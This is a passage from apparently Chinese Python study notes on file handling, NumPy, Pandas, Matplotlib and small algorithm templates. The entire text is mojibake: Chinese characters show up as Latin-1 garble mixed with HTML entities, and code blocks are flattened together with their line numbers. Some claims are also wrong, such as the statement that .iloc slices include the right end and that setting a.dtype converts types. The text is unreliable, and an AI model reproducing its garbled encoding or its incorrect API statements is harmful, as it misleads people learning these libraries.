ä¿è¯â€œæ’å…¥é¡ºåºâ€ä½†ä¸ç”¨äºé€»è¾‘æ’åºï¼‰ã€‚ pop() / update() éƒ½ä¼šä¿®æ”¹åŸå­—å…¸ï¼›æƒ³ä¿æŒåŸæ•°æ®åˆ«ç›´æ¥åŠ¨å®ƒã€‚ å­—å…¸å¾ˆé€‚åˆå½“â€œå“ˆå¸Œè¡¨â€åš O(1) æŸ¥è¯¢ï¼Œä¾‹å¦‚è®°å½•å­—ç¬¦é¢‘æ¬¡ã€ç¼“å­˜è®¡ç®—ç»“æœç­‰ã€‚ ##â€¯1.3â€¯æ–‡ä»¶ç®€å•æ“ä½œ\n###â€¯1.3.1â€¯open() åŸºæœ¬è¯­æ³•\n1 f = open(filepath, mode=\u0026#34;r\u0026#34;, encoding=\u0026#34;utfâ€‘8\u0026#34;) å½¢å‚ å¸¸ç”¨å–å€¼ è¯´æ˜ï¼ˆä¸€å¥è¯è®°ä½å°±å¤Ÿï¼‰ filepath \u0026quot;data.txt\u0026quot; / \u0026quot;./dir/log.csv\u0026quot; æ–‡ä»¶ç›¸å¯¹æˆ–ç»å¯¹è·¯å¾„ mode \u0026quot;r\u0026quot; è¯»â€ƒ\u0026quot;w\u0026quot; å†™(è¦†ç›–)â€ƒ\u0026quot;a\u0026quot; è¿½åŠ \u0026quot;rb\u0026quot; äºŒè¿›åˆ¶è¯»â€ƒ\u0026quot;wb\u0026quot; äºŒè¿›åˆ¶å†™ r=readâ€ƒw=writeâ€ƒa=append encoding \u0026quot;utf-8\u0026quot;ï¼ˆæœ€å¸¸ç”¨ï¼‰ æ–‡æœ¬æ–‡ä»¶çš„å­—ç¬¦é›†ï¼›äºŒè¿›åˆ¶æ¨¡å¼ä¸ç”¨å†™ \u0026quot;w\u0026quot; ä¼šæ¸…ç©ºæ—§æ–‡ä»¶ï¼›è‹¥æƒ³å®‰å…¨ä¸€äº›ï¼Œå…ˆç”¨ \u0026quot;a\u0026quot; æˆ–æ£€æŸ¥ os.path.exists()ã€‚ çœç•¥ encoding å¯èƒ½åœ¨ä¸åŒç³»ç»Ÿè¯»å†™ä¸­æ–‡æ—¶ä¹±ç ï¼Œæœ€å¥½æ˜¾å¼å†™ \u0026quot;utfâ€‘8\u0026quot;ã€‚ ###â€¯1.3.2â€¯æ¨èå†™æ³•ï¼šwith â€¦ as\n1 2 3 with open(\u0026#34;data.txt\u0026#34;, \u0026#34;r\u0026#34;, encoding=\u0026#34;utf-8\u0026#34;) as f: text = f.read() # ç¦»å¼€ with å—ï¼Œæ–‡ä»¶è‡ªåŠ¨ close() è€ƒç‚¹ï¼šç”¨ *with* å¯ä»¥è‡ªåŠ¨å…³é—­æ–‡ä»¶ï¼Œçœå» *f.close()*ï¼Œä¹Ÿèƒ½é¿å…å¿˜å…³å¯¼è‡´æ•°æ®æ²¡è½ç›˜ã€‚\n###â€¯1.3.3â€¯å¸¸ç”¨è¯»å†™æ–¹æ³•\nè°ƒç”¨ ç”¨é€” è¿”å›å€¼ / è¡Œä¸º å…¸å‹ç¤ºä¾‹ f.read() è¯»å®Œæ•´ä¸ªæ–‡ä»¶ å­—ç¬¦ä¸² data = f.read() f.readline() è¯»ä¸€è¡Œï¼ˆå« \\nï¼‰ å­—ç¬¦ä¸² line = f.readline() f.readlines() æŒ‰è¡Œè¯»å…¨éƒ¨ åˆ—è¡¨ï¼Œæ¯è¡Œä¸€å…ƒç´  lines = f.readlines() f.write(s) å†™å…¥å­—ç¬¦ä¸² s å†™å…¥å­—èŠ‚æ•° (int) f.write(\u0026quot;hello\\n\u0026quot;) f.writelines(list) è¿ç»­å†™å¤šè¡Œ None f.writelines(lines) f.close() æ‰‹åŠ¨å…³æ–‡ä»¶ None ä¸ç”¨ with æ—¶å¿…é¡»è°ƒ è¯»å®Œåæ–‡ä»¶æŒ‡é’ˆåœ¨æœ«å°¾ï¼Œæƒ³å†è¯»éœ€è¦ f.seek(0) æŠŠæŒ‡é’ˆç§»å›å¼€å¤´ã€‚ write() ä¸è‡ªåŠ¨æ¢è¡Œï¼Œè®°å¾—æ‰‹åŠ¨åŠ  \\nã€‚ äºŒè¿›åˆ¶æ¨¡å¼ (\u0026quot;rb\u0026quot;, \u0026quot;wb\u0026quot;) è¯»å†™å¾—åˆ°/è¦æ±‚ bytes è€Œé strã€‚ ###â€¯1.3.4â€¯æœ€å¸¸è§ 2 ä¸ªæ¨¡æ¿\nâ‘  é€è¡Œè¯»å–å¹¶å¤„ç†\n1 2 3 4 with open(\u0026#34;score.txt\u0026#34;, \u0026#34;r\u0026#34;, encoding=\u0026#34;utf-8\u0026#34;) as f: for line in f: # f æœ¬èº«å°±å¯è¿­ä»£ name, score = line.split() ... â‘¡ å†™åˆ†æç»“æœ\n1 2 3 4 with open(\u0026#34;result.txt\u0026#34;, \u0026#34;w\u0026#34;, encoding=\u0026#34;utf-8\u0026#34;) as f: f.write(f\u0026#34;Average {avg:.1f}\\n\u0026#34;) for k, v in top_items: f.write(f\u0026#34;{k} {v}\\n\u0026#34;) åªè¦è®°ä½â€œwith open(...) as f: âœ f.read / f.write âœ è‡ªåŠ¨å…³é—­â€ï¼Œæ–‡ä»¶ I/O çš„åŸºç¡€å°±å¤Ÿç”¨äº†ã€‚\n0x2 æ•°æ®åˆ†æ #æ­¤èŠ‚è¿‡äºå‘çˆ¹ï¼ˆåŠèŠ‚è¯¾è®²äº†4-5èŠ‚çš„å†…å®¹ï¼Ÿï¼Ÿï¼‰ æ•…é™„ä¸Šå®˜æ–¹æ–‡æ¡£ä»¥ä¾›æ‰“å°ï¼æœ¬æ–‡æ¡£æ­¤å¤„åªç®€å•åˆ—å‡ºåŸºç¡€ç”¨æ³•ã€‚ç”¨äºæç¤ºï¼ï¼ï¼ï¼ï¼\nNumPyï¼šåˆå­¦è€…çš„ç»å¯¹åŸºç¡€_Numpyä¸­æ–‡ç½‘\nå…¥é—¨æ•™ç¨‹ â€” pandas 2.2.3 æ–‡æ¡£ - pandas æ•°æ®åˆ†æåº“\n2.1 NumPy åº“ ä¸€å¥è¯è®°ä½ï¼š NumPy = è¶…å¿«å¤šç»´æ•°ç»„ + çŸ¢é‡åŒ–æ•°å­¦è¿ç®—ã€‚\n1 import numpy as np # âš ï¸ åˆ«å†™æˆ import np as np 2.1.1 æ•°ç»„åˆ›å»º æ–¹æ³• åŠŸèƒ½ ç¤ºä¾‹ np.array(obj, dtype=â€¦) åˆ—è¡¨ â†’ æ•°ç»„ï¼›å¯æŒ‡å®šç±»å‹ np.array([[1,2],[3,4]], dtype=np.int32) np.arange(start, stop, step) ç­‰å·®åºåˆ— np.arange(0, 10, 2) np.linspace(start, stop, num) å‡åˆ† num ä¸ªç‚¹ np.linspace(0, 1, 5) np.zeros(shape) å…¨ 0 np.zeros((2,3)) np.ones(shape) å…¨ 1 np.ones((2,3)) np.eye(N) / np.eye(M,N,k) å•ä½é˜µ / åç§»å¯¹è§’é˜µ np.eye(5)``np.eye(3,5,2) np.full(shape, fill_value) å›ºå®šå€¼âš ï¸ è‹¥ ***\\**\\*fill_value\\*\\**\\*** æ˜¯åˆ—è¡¨ï¼Œå…¶é•¿åº¦å¿…é¡» == æœ€åä¸€ç»´é•¿åº¦ np.full((2,3,4), 9)``np.full((2,3,4), [1,2,3,4]) 2.1.1.1 éšæœºæ•°ç»„ æ–¹æ³• åŠŸèƒ½ ç¤ºä¾‹ âš ï¸ æ˜“é”™ç‚¹ np.random.random(shape) [0,1) å‡åŒ€ np.random.random((2,3)) åªèƒ½ä¼ å½¢çŠ¶å…ƒç»„ï¼Œä¸èƒ½åˆ†å†™ m,n np.random.randn(d1,d2,â€¦) æ ‡å‡†æ­£æ€ np.random.randn(2,3) ä¸èƒ½æŠŠæ•´ä½“ shape æ‰“åŒ…æˆå…ƒç»„ np.random.randint(low, high, size=shape) æ•´æ•°éšæœº np.random.randint(0, 10, size=(2,3)) 2.1.2 æ•°ç»„ä¿®æ”¹ 2.1.2.1 å½¢çŠ¶ \u0026amp; ç±»å‹ æ“ä½œ è¯´æ˜ âš ï¸ æç¤º a.reshape(new_shape) æ›´æ”¹å½¢çŠ¶ï¼Œå…ƒç´ æ€»æ•°ä¸å˜ å¤šä½™/ä¸è¶³éƒ½ä¼šæŠ¥é”™ï¼Œä¸ä¼šè‡ªåŠ¨å¡«è¡¥ a.T / a.transpose() è½¬ç½® a.astype(dtype) or a.dtype = dtype æ”¹ç±»å‹ å¸¸ç”¨åˆ«åï¼šnp.int_, np.float_ ç­‰ 2.1.2.2 æ•°æ®çº§æ”¹åŠ¨ åˆ‡ç‰‡æ¢åºï¼ša[::-1]ã€a[:, ::-1] åˆå¹¶ï¼šnp.concatenate([a,b], axis=â€¦) æ’å…¥ï¼šnp.insert(a, index, values, axis=â€¦) 2.1.3 å±æ€§æŸ¥è¯¢ \u0026amp; åˆ‡ç‰‡ å±æ€§å«ä¹‰å¿«é€ŸæŸ¥çœ‹ shape å½¢çŠ¶ (è¡Œ, åˆ—, â€¦) a.shape dtype å…ƒç´ ç±»å‹ï¼ˆint32ã€float64â€¦ï¼‰ a.dtype ndim ç»´åº¦æ•° a.ndim size å…ƒç´ æ€»æ•° a.size nbytes å ç”¨å­—èŠ‚æ•° a.nbytes itemsize æ¯ä¸ªå…ƒç´ å å­—èŠ‚ a.itemsize å¤šç»´åˆ‡ç‰‡èŒƒå¼\n1 2 a[:, s:e:step] # å¤šè¡Œéƒ¨åˆ†åˆ— a[i, j] # å•ä¸ªå…ƒç´  2.1.4 é€»è¾‘è¿ç®— \u0026amp; æ¡ä»¶ç­› 1 2 3 mask = (a \u0026gt;= 5) # å¸ƒå°”çŸ©é˜µ a2 = a[mask] # âš ï¸ mask å¿…é¡»æ˜¯ bool åŒå°ºå¯¸ sel = np.where(mask, x, y) # ä¸‰å‚ç¼ºä¸€ä¸å¯ âš ï¸ é€»è¾‘è¿ç®—ç¬¦è¦ç”¨ ***\\**\\*\u0026amp;\\*\\**\\*** / ***\\**\\*|\\*\\**\\***ï¼Œå¹¶åŠ æ‹¬å·\n1 (a \u0026gt; 1) \u0026amp; (a \u0026lt; 5) 2.1.5 å¹¿æ’­ (Broadcasting) åœºæ™¯ ä¾‹å­ âš ï¸ æ³¨æ„ æ ‡é‡ Ã— æ•°ç»„ a * 3 ä¸åŒå½¢çŠ¶æ•°ç»„ (3,1) Ã— (1,4) â†’ (3,4) æ•°å€¼é™·é˜± 0**0 å¾—åˆ° 1 1/0 â†’ infï¼Œå¯ np.isinf æ£€æµ‹ å‘é‡/çŸ©é˜µä¹˜æ³•\n1 2 np.dot(a, b) # ç‚¹ä¹˜ np.cross(a, b) # å‰ä¹˜ 2.1.6 ç»Ÿè®¡ \u0026amp; èšåˆ å‡½æ•° ä½œç”¨ a.sum(axis) / a.mean(axis) æ±‚å’Œ / å‡å€¼ a.min / a.max æœ€å° / æœ€å¤§ a.var / a.std æ–¹å·® / æ ‡å‡†å·® è½´è§£é‡Šï¼šaxis=0 â‡¢ æŒ‰è¡Œèšåˆï¼ˆçœ‹æˆâ€œåˆ—æ–¹å‘â€ï¼‰ï¼›axis=1 â‡¢ æŒ‰åˆ—èšåˆã€‚\n2.1.7 æ‹·è´è¯­ä¹‰ æ–¹æ³• æ•°æ®æ˜¯å¦å¤åˆ¶ ç”¨é€” b = a.view() å¦ è½»é‡åˆ«åï¼Œå…±äº«åº•å±‚æ•°æ® b = a.copy() æ˜¯ æ·±æ‹·è´ï¼Œäº’ä¸å½±å“ 2.1.8 åˆ é™¤ \u0026amp; å»é‡ æ“ä½œ ç¤ºä¾‹ âš ï¸ å‘ç‚¹ å»é‡ np.unique(a) åˆ é™¤ np.delete(a, idx, axis=None) â‘  axis=None â†’ æ‰å¹³åŒ–ååˆ â‘¡ åˆ å•å…ƒä¼šç ´åçŸ©é˜µå½¢çŠ¶ï¼Œç»“æœä¸€ç»´ âš¡ é€Ÿè®°æ¸…å• **import numpy as np**ï¼ˆåˆ«å†™æˆ import npï¼‰ã€‚ éšæœºæ•°ç»„ï¼šrandom.random(shape) åªèƒ½å½¢çŠ¶å…ƒç»„ï¼Œrandom.randn ç›´æ¥å†™ç»´åº¦ã€‚ é€»è¾‘è¿ç®—è®°å¾— **\u0026amp;**** / ***\\*|\\**** + æ‹¬å·**ã€‚ np.where(cond, x, y) ä¸‰ä¸ªå‚æ•°ä¸å¯å°‘ã€‚ è½¬ç½® a.Tï¼Œæ”¹å½¢ a.reshape(new_shape) ä¸æ”¹å˜å…ƒç´ æ€»æ•°ã€‚ view() å…±äº«æ•°æ®ï¼Œcopy() ç‹¬ç«‹æ•°æ®ã€‚ 0**0 == 1ï¼›1/0 â†’ infã€‚ np.delete çš„ axis è¡¨ç¤ºåœ¨å“ªä¸ªè½´ä¸Šåˆ ç´¢å¼•ï¼Œå†™é”™ä¼šé™ç»´ã€‚ 2.2 Pandas åº“æ¦‚è§ˆ ä¸€å¥è¯è®°ä½ï¼š Pandas = â€œå¸¦æ ‡ç­¾çš„ä¸€ç»´ Series + äºŒç»´ DataFrameâ€ + å¤§é‡ SQL é£æ ¼æ“ä½œ\n1 import pandas as pd # âš ï¸ åˆ«å†™æˆ import pandas as np 2.2.1 è¯»å…¥æ•°æ® å‡½æ•° ä¸»è¦å‚æ•° âš ï¸ å‘ç‚¹ pd.read_csv(filepath, sep=',', header='infer', names=â€¦, index_col=â€¦, skiprows=â€¦) sep åˆ†éš”ç¬¦header: è¡Œå·æˆ– Nonenames: è‡ªæŒ‡å®šåˆ—åindex_col: å“ªåˆ—åšç´¢å¼•skiprows: è·³è¿‡å‰å‡ è¡Œ **header=True** å†™æ³•éæ³•ï¼ åº”å†™ header=0 æˆ– header=None å…¶ä»–ï¼šread_excel, read_sqlâ€¦ æ­¤å¤„ä¸å±•å¼€ 1 2 df = pd.read_csv(\u0026#34;data.csv\u0026#34;, sep=\u0026#34;,\u0026#34;, index_col=0) df.head(4) # é¢„è§ˆå‰ 4 è¡Œ åŸºæœ¬ä¿¡æ¯é€ŸæŸ¥ 1 2 3 4 5 df.shape # (è¡Œ, åˆ—) df.columns # Index([...]) df.index # RangeIndex / DatetimeIndex â€¦ df.dtypes # æ¯åˆ—ç±»å‹ df.size # å…ƒç´ æ€»æ•° 2.2.2 æ ¸å¿ƒæ•°æ®ç»“æ„ ç»“æ„ åˆ›å»ºæ–¹å¼ è¯´æ˜ Series pd.Series(list_or_dict) âš ï¸ é¦–å­—æ¯å¤§å†™ï¼›è‹¥ç”¨å­—å…¸ï¼Œç´¢å¼•è·Ÿéšå­—å…¸é”® DataFrame pd.DataFrame(dict_or_ndarray) å•è¡Œè§†ä½œ Seriesï¼Œä½† df[['name']] ä»è¿”å› DataFrame 2.2.2.1 Series è®¿é—® 1 2 3 s[\u0026#39;label\u0026#39;] # å•å…ƒç´  s[3:8] # åˆ‡ç‰‡ s[[\u0026#39;a\u0026#39;,\u0026#39;b\u0026#39;]] # ä¼ åˆ—è¡¨ä»å¾—åˆ° Series 2.2.2.2 DataFrame è®¿é—® æ–¹å¼ ç¤ºä¾‹ è¿”å› æŒ‰åˆ— df['col'] Series å¤šåˆ— df[['c1','c2']] DataFrame é‡æ’åˆ—é¡ºåº df[['c3','c1','c2']] New DataFrame **.loc** df.loc['row', 'col'] æ ‡ç­¾å–å€¼ **.iloc** df.iloc[0, 1] çº¯æ•´æ•°ä½ç½® **.at** / **.iat** å•å…ƒç´ æé€Ÿå®šä½ df.at['r','c'] âš ï¸ **.iloc** ä¸æ”¯æŒå¸ƒå°” / labelï¼Œåªæ¥å—æ•´æ•°ï¼›åˆ‡ç‰‡å³ç«¯ åŒ…å«ã€‚\n2.2.3 æŸ¥è¯¢ï¼ˆäº”å¤§å¥—è·¯ï¼‰ **loc** â€” æœ€æ¨èï¼šé€»è¾‘ã€åˆ‡ç‰‡ã€å‡½æ•°ä¸€æŠŠæŠ“\n1 2 3 df.loc[(df[\u0026#39;name\u0026#39;]!=\u0026#39;NaN\u0026#39;) \u0026amp; (df[\u0026#39;age\u0026#39;]\u0026gt;18)] df.loc[\u0026#39;20240101\u0026#39;:\u0026#39;20240131\u0026#39;] df.loc[lambda d: d[\u0026#39;score\u0026#39;] \u0026gt; 90] **iloc**ï¼šçº¯æ•°å­—è¡Œåˆ—\n**where**ï¼šä¿æŒåŸå½¢ï¼Œæ¡ä»¶ä¸æ»¡è¶³å¤„å¡« NaN\n**query**ï¼šSQL é£æ ¼å­—ç¬¦ä¸²ï¼Œåˆ—åå¯ç›´æ¥å†™\n1 df.query(\u0026#34;age \u0026gt; 18 and city == \u0026#39;Beijing\u0026#39;\u0026#34;) å¸ƒå°”ç´¢å¼•ï¼šmask = (df['x']\u0026gt;0); df[mask]\n2.2.4 æ–°å¢ / ä¿®æ”¹åˆ— æ–¹æ³• ç¤ºä¾‹ ç›´æ¥èµ‹å€¼ df['new'] = df['old'] * 1.2 **loc** å†™åˆ— df.loc[:, 'flag'] = (df['score']\u0026gt;60) str å¤„ç† df['city'] = df['city'].str.replace('å¸‚','') ç±»å‹è½¬æ¢ df['age'] = df['age'].astype(int) **apply(func, axis)** è¡Œçº§: axis=1ï¼›åˆ—çº§: axis=0df['sum'] = df.apply(lambda r: r.a+r.b, axis=1) å¤šåˆ— apply è¿”å› pd.Series å¹¶ join 2.2.5 ç»Ÿè®¡ä¸æè¿° 1 2 3 4 5 df.describe() # æ•°å€¼åˆ—ï¼šå‡å€¼ã€å››åˆ†ä½â€¦ df[\u0026#39;col\u0026#39;].mean() df[\u0026#39;col\u0026#39;].max() df[\u0026#39;col\u0026#39;].min() df[\u0026#39;col\u0026#39;].value_counts() # ç±»åˆ«è®¡æ•° ç›¸å…³çŸ©é˜µ ç¤ºä¾‹ åæ–¹å·® df[['x','y']].cov() ç›¸å…³ç³»æ•° df[['x','y']].corr() 2.2.6 ç¼ºå¤±å€¼å¤„ç† å‡½æ•° å…³é”®å‚æ•° è¯´æ˜ isnull / notnull - è¿”å›å¸ƒå°”åŒç»´åº¦ dropna(axis=0, how='any', inplace=False) axis: 0 è¡Œ / 1 åˆ—how: 'any' æˆ– 'all' åˆ é™¤åŒ…å«ç©ºå€¼çš„è¡Œ/åˆ— fillna(value=â€¦, method=â€¦, axis=0, inplace=False) value: å•å€¼æˆ–åˆ—åâ†’å€¼å­—å…¸method: 'ffill' / 'bfill' å‰å‘ / åå‘å¡«å…… 2.2.7 æ’åº \u0026amp; é‡æ’ 1 df.sort_values(by=[\u0026#39;score\u0026#39;,\u0026#39;age\u0026#39;], ascending=[False,True], inplace=True) âš¡ é€Ÿè®°æ¸…å• **read_csv** å‚æ•°ï¼š**sep**+**header**+**names**+**index_col**ï¼›header=True å†™æ³•ä¼šç‚¸ï¼ Series/DataFrame é¦–å­—æ¯å¤§å†™ã€‚ **loc** ä¸‡èƒ½ï¼šæ ‡ç­¾ã€é€»è¾‘ã€å‡½æ•°ï¼Œä¸”å¯åŒæ—¶èµ‹å€¼ã€‚ .iloc åªè®¤æ•´æ•°ä½ï¼›åˆ‡ç‰‡å³ç«¯åŒ…å«ã€‚ æ–°åˆ—å¯ç›´æ¥ df['new'] = â€¦ï¼›è¡Œçº§è®¡ç®—è®°å¾— axis=1ã€‚ ç¼ºå¤±å€¼ï¼šdropna vs fillnaï¼Œmethod='ffill'/'bfill'ã€‚ value_counts() è®¡ç±»åˆ«ï¼›describe() çœ‹å…¨è²Œã€‚ sort_values æ”¯æŒå¤šåˆ— \u0026amp; ä¸åŒå‡é™åºï¼šascending=[â€¦]ã€‚ 2.3 Matplotlib â€“ pyplot é€ŸæŸ¥ æ ¸å¿ƒæµç¨‹\nplt.figure() åˆ›å»ºç”»å¸ƒ plt.plot()ï¼plt.scatter() ç»˜å›¾ è®¾ç½®æ ‡é¢˜ã€æ ‡ç­¾ã€ç½‘æ ¼ã€å›¾ä¾‹ plt.savefig() + plt.show() è¾“å‡º 2.3.1 ç”»å¸ƒ 1 2 3 import matplotlib.pyplot as plt plt.figure(figsize=(6, 4), dpi=100) # 6Ã—4 è‹±å¯¸ï¼Œ100 DPI è‹¥ä¸è°ƒç”¨ plt.figure()ï¼Œä¼šé»˜è®¤åˆ›å»ºä¸€ä¸ªæ–°ç”»å¸ƒã€‚ fig = plt.gcf() å¯ä»¥è·å–å½“å‰ Figure å¯¹è±¡ã€‚ 2.3.2 ç›´çº¿å›¾ï¼šplt.plot 1 2 3 4 plt.plot(x, y, fmt, linewidth=2, alpha=0.8, label=\u0026#34;Series-A\u0026#34;) **fmt**** = é¢œè‰² + æ ‡è®° + çº¿å‹**ï¼ˆé¡ºåºä¸é™ï¼Œå¯ç¼ºçœå…¶ä¸­ä»»æ„éƒ¨åˆ†ï¼‰ã€‚ ç»„ä»¶ ä»£ç  è¯´æ˜ é¢œè‰² b g r c m y k w blue/green/red/cyan/magenta/yellow/black/white æ ‡è®° . o v ^ \u0026lt; \u0026gt; s * + x D point/circle/tri_down/tri_up/â€¦/square/star/plus/x/diamond çº¿å‹ - / -- / -. / : / '' solid/dashed/dash-dot/dotted/none 1 2 3 plt.plot(x, y, \u0026#34;ro--\u0026#34;) # red circle + dashed line plt.plot(x2, y2, \u0026#34;g^:\u0026#34;) # green triangle_up + dotted line plt.plot(x3, y3, \u0026#34;k*\u0026#34;) # black star, no line âš ï¸\nåªè¦çº¿æ¡ã€é»˜è®¤è“è‰²ï¼š\u0026quot;-\u0026quot; ç­‰åŒäº \u0026quot;b-\u0026quot; åªè¦æ ‡è®°ã€æ— çº¿æ¡ï¼š\u0026quot;o\u0026quot; ç­‰åŒäº \u0026quot;bo\u0026quot; triæ˜¯ä¸‰è§’å½¢çš„æ„æ€ 2.3.3 æ•£ç‚¹å›¾ï¼šplt.scatter 1 2 3 4 5 6 7 plt.scatter(x, y, s=40, # ç‚¹é¢ç§¯ c=\u0026#34;tomato\u0026#34;, # é¢œè‰² marker=\u0026#34;^\u0026#34;, # æ ‡è®° edgecolors=\u0026#34;k\u0026#34;, # è¾¹æ¡†è‰² alpha=0.7, label=\u0026#34;Points\u0026#34;) è‹¥è¦æŒ‰æ•°å€¼æ˜ å°„é¢œè‰²ï¼Œå¯ä¼ å…¥æ•°ç»„ç»™ c= å¹¶æŒ‡å®š cmapã€‚ 2.3.4 æ³¨é‡Šå…ƒç´  1 2 3 4 5 plt.title(\u0026#34;Main Title\u0026#34;, fontsize=14) plt.xlabel(\u0026#34;X-Label\u0026#34;) plt.ylabel(\u0026#34;Y-Label\u0026#34;) plt.grid(True, linestyle=\u0026#34;:\u0026#34;, alpha=0.3) plt.legend(loc=\u0026#34;best\u0026#34;) # æ˜¾ç¤ºæ‰€æœ‰å¸¦ label çš„å›¾ä¾‹ 2.3.5 ä¿å­˜ä¸æ˜¾ç¤º 1 2 plt.savefig(\u0026#34;figure.png\u0026#34;, dpi=300, bbox_inches=\u0026#34;tight\u0026#34;) plt.show() # æœ€åè°ƒç”¨ï¼Œå¦åˆ™åœ¨æŸäº›ç¯å¢ƒä¼šæ¸…ç©ºå½“å‰ç”»å¸ƒ âš¡ é€Ÿè®°æ¸…å• **fmt**** (***\\*plt.plot\\****)** = é¢œè‰² + æ ‡è®° + çº¿å‹ï¼Œä»»æ„ç»„åˆã€çœç•¥ã€‚ ç›´çº¿å›¾ ç”¨ plt.plot(x,y, fmt)ï¼›æ•£ç‚¹å›¾ ç”¨ plt.scatter(x,y, s, c, marker). label + plt.legend() â†’ è‡ªåŠ¨ç”Ÿæˆå›¾ä¾‹ï¼ˆçº¿å¯¹åº”å…³ç³»ï¼‰ã€‚ è°ƒç”¨ plt.grid(True) åŠ ç½‘æ ¼ï¼›é€æ˜åº¦ç”± alpha æ§åˆ¶ã€‚ å…ˆ savefigï¼ˆdpiâ‰¥150ï¼‰ï¼Œå† show()ã€‚ 0x3 å¸¸ç”¨ç®—æ³•ä¸æŠ€å·§ ä¸‹é¢æ±‡æ€»ä¸€äº›åœ¨ç¼–ç¨‹ç«èµ›ä¸æ—¥å¸¸è„šæœ¬ä¸­å¸¸è§åˆå¥½ç”¨çš„å°æŠ€å·§ï¼Œæ¶µç›–è¾“å…¥è¾“å‡ºã€å­—ç¬¦ä¸²å¤„ç†ã€å¾ªç¯å¥—è·¯ã€å¸¸ç”¨åº“ã€å–ä½™å¦™ç”¨å’Œæ–‡ä»¶æ“ä½œã€‚å¤åˆ¶å³å¯è®°å…¥ç¬”è®°ã€‚\n3.1 è¾“å…¥ï¼è¾“å‡º æŠ€å·§ æ‰¹é‡è¯»å…¥å¤šå˜é‡\n1 2 # âš ï¸ eval å­˜åœ¨å®‰å…¨é£é™©ï¼Œä»…é™ç«èµ›æˆ–å—ä¿¡æ•°æ® a, b, c = eval(input()) # è¾“å…¥æ ¼å¼å¦‚ï¼š1,2,3 åˆ†å‰²å¹¶è½¬ç±»å‹\n1 2 3 # æ­£ç¡®å†™æ³• a, b, c = map(int, input().split()) # è¾“å…¥ï¼š1 2 3 â†’ å…¨è½¬ä¸º int # åŒç†ï¼šmap(float, â€¦)ã€map(str, â€¦) å­—ç¬¦é—´éš”æ’å…¥\n1 2 s = input() # e.g. \u0026#34;12345\u0026#34; print(\u0026#34; \u0026#34;.join(s)) # è¾“å‡ºï¼š1 2 3 4 5 æ–‡æœ¬å€’ç½®ï¼æ•´æ•°åè½¬\n1 2 3 4 5 s = input() print(s[::-1]) # å­—ç¬¦ä¸²å€’ç½® n = int(input()) rev = int(str(n)[::-1]) # æ•´æ•°åè½¬ 3.2 å­—ç¬¦ä¸²ä¸ç¼–ç  ASCII ç äº’è½¬\næ“ä½œ ç¤ºä¾‹ å­—ç¬¦ â†’ ç ç‚¹ ord('A') # 65 ç ç‚¹ â†’ å­—ç¬¦ chr(9731) # 'â˜ƒ' å¸¸è§èŒƒå›´\nèŒƒå›´ ç ç‚¹åŒºé—´ 0â€“9 48 â€“ 57 Aâ€“Z 65 â€“ 90 aâ€“z 97 â€“ 122 åˆ‡ç‰‡æŠ€å·§\n1 2 3 4 s = \u0026#34;abcdefg\u0026#34; s[2:5] # ä»ç´¢å¼• 2 åˆ° 4ï¼Œå«å¤´ä¸å«å°¾ s[:-1] # é™¤å»æœ€åä¸€ä½ s[-1] # ä»…æœ€åä¸€ä½ é¦–å­—æ¯ï¼å•è¯å¤§å†™\n1 2 s.title() # æ¯ä¸ªå•è¯é¦–å­—æ¯å¤§å†™ s.capitalize() # ä»…ç¬¬ä¸€ä¸ªå­—ç¬¦å¤§å†™ ç©ºç™½å­—ç¬¦å¤„ç†\n1 2 3 s.strip() # å»é™¤é¦–å°¾ç©ºç™½ s.lstrip() # å»é™¤å·¦ä¾§ç©ºç™½ s.rstrip() # å»é™¤å³ä¾§ç©ºç™½ å¸¸ç”¨åˆ¤åˆ« / è½¬æ¢\næ–¹æ³• è¯´æ˜ s.isdigit() å…¨éƒ¨ä¸ºæ•°å­— s.isalpha() å…¨éƒ¨ä¸ºå­—æ¯ s.isnumeric() æ•°å­—å­—ç¬¦ï¼ˆå«ä¸­æ–‡æ•°å­—ï¼‰ s.upper() å…¨éƒ¨è½¬å¤§å†™ s.endswith(x) æ˜¯å¦ä»¥ x ç»“å°¾ s.startswith(x) æ˜¯å¦ä»¥ x å¼€å¤´ s.count(sub) å­ä¸²å‡ºç°æ¬¡æ•° 3.3 å¾ªç¯ å¸¸è§æ¨¡æ¿ æ¯è¡Œæ‰“å° n ä¸ªæ•°\n1 2 3 4 5 6 nums = list(range(1, 21)) n = 5 for i, v in enumerate(nums, 1): print(v, end=\u0026#39; \u0026#39;) if i % n == 0: print() ç®€æ˜“ç´ æ•°åˆ¤æ–­ï¼ˆ$O(\\sqrt n)$ï¼‰\n1 2 3 4 5 6 7 8 def is_prime(x): if x \u0026lt; 2: return False i = 2 while i * i \u0026lt;= x: if x % i == 0: return False i += 1 return True ä¹˜æ³•è¡¨\n1 2 3 4 5 n = 9 for i in range(1, n+1): for j in range(1, i+1): print(f\u0026#34;{j}Ã—{i}={i*j}\u0026#34;, end=\u0026#39;\\t\u0026#39;) print() æ–æ³¢é‚£å¥‘\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # æŒ‡å®šé¡¹æ•° def fib(n): a, b = 0, 1 for _ in range(n): print(a, end=\u0026#39; \u0026#39;) a, b = b, a + b print() # æŒ‡å®šæœ€å¤§å€¼ def fib_upto(maxv): a, b = 0, 1 while a \u0026lt;= maxv: print(a, end=\u0026#39; \u0026#39;) a, b = b, a + b print() 3.4 å–ä½™ (%) çš„å¦™ç”¨ å‡¯æ’’å¯†ç ï¼ˆå­—ç¬¦ä¸²å¾ªç¯ç§»ä½ï¼‰\n1 2 3 4 5 6 7 8 def caesar(s, shift): res = [] for ch in s: if \u0026#39;a\u0026#39; \u0026lt;= ch \u0026lt;= \u0026#39;z\u0026#39;: res.append(chr((ord(ch)-97+shift)%26 + 97)) else: res.append(ch) return \u0026#39;\u0026#39;.join(res) æ˜ŸæœŸå¾ªç¯\n1 2 days = [\u0026#34;Mon\u0026#34;,\u0026#34;Tue\u0026#34;,\u0026#34;Wed\u0026#34;,\u0026#34;Thu\u0026#34;,\u0026#34;Fri\u0026#34;,\u0026#34;Sat\u0026#34;,\u0026#34;Sun\u0026#34;] idx = (idx + k) % 7 3.5 å¿«é€Ÿæ–‡ä»¶æ“ä½œï¼šwith è¯­å¥ 1 2 3 4 with open(\u0026#34;file.txt\u0026#34;, \u0026#34;r\u0026#34;, encoding=\u0026#34;utf-8\u0026#34;) as f: for line in f: print(line.rstrip()) # æ— éœ€æ‰‹åŠ¨ close() Tipsï¼š\nå¸¸è§ç®—æ³•å°½é‡å°è£…æˆå‡½æ•°ï¼Œä¸»æµç¨‹æ¸…æ™°ï¼› 